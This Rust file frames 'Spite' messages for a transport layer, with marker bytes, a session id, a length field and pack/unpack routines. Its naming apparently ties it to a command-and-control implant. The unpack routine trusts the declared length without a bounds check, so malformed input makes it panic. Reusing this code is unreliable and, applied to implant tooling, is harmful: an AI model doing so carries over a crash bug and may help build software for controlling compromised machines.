use std::mem::{size_of};
static TRANSPORT_START : u8 = 0xd1;
static TRANSPORT_END : u8 = 0xd2;

// pub static TRANSPORT_TYPE_UNKNOWN: u8 = 0x0;
// pub static TRANSPORT_TYPE_SPITE: u8 = 0x1;

#[derive(Debug)]
pub enum UnpackStatus {
    NoStart,
    NoEnd,
    LengthError,
    // UnknownError,
    // Multiple
}

pub struct Spite {
    start : u8,
    session_id : [u8;4],
    length : u32,
    // r#type : u8,
    // padding : [u8;3],
    data : Vec<u8>,
    end: u8
}

impl Spite {
    pub fn default() -> Self {
        Spite {
            start : TRANSPORT_START,
            session_id : [0u8;4],
            length : 0,
            // r#type : TRANSPORT_TYPE_UNKNOWN,
            // padding: [0u8;3],
            data: Vec::new(),
            end : TRANSPORT_END
        }
    }

    pub fn new(session_id: [u8;4], data: &[u8]) -> Self {
        // let len = data.len() + size_of::<u32>() + 1 + 1 + 3 + 1;
        let len = data.len();
        let length :u32 = len as u32;
        Spite {
            start : TRANSPORT_START,
            session_id,
            length,

            // padding: [0u8;3],
            data: data.to_vec(),
            end : TRANSPORT_END
        }
    }

    pub fn pack(&mut self) -> Vec<u8> {
        let mut buf = Vec::new();
        buf.push(self.start);
        buf.extend_from_slice(&self.session_id);
        buf.extend_from_slice(&self.length.to_le_bytes());
        // buf.push(self.r#type);
        // buf.extend_from_slice(&self.padding);
        buf.extend_from_slice(&self.data);
        buf.push(self.end);
        buf
    }

    pub fn unpack(&mut self, buf: Vec<u8>) -> Result<bool, UnpackStatus> {
        malefic_helper::debug!("buf size is {}", buf.len());
        // 检查buf长度
        if buf.len() < size_of::<u32>() + 4 + 2 {
            return Err(UnpackStatus::LengthError);
        }

        // 检查开始和结束标记
        if buf[0] != TRANSPORT_START {
            return Err(UnpackStatus::NoStart);
        }
        if buf[buf.len() - 1] != TRANSPORT_END {
            return Err(UnpackStatus::NoEnd);
        }

        let mut pos = 1;
        self.session_id = [buf[pos], buf[pos + 1], buf[pos + 2], buf[pos + 3]];
        pos += 4;
        self.length = u32::from_le_bytes([buf[pos], buf[pos + 1], buf[pos + 2], buf[pos + 3]]);
        pos += size_of::<u32>();
        self.data = buf[pos..pos + self.length as usize].to_vec();
        Ok(true)
    }

    pub fn get_data(&self) -> &Vec<u8> {
        &self.data
    }
}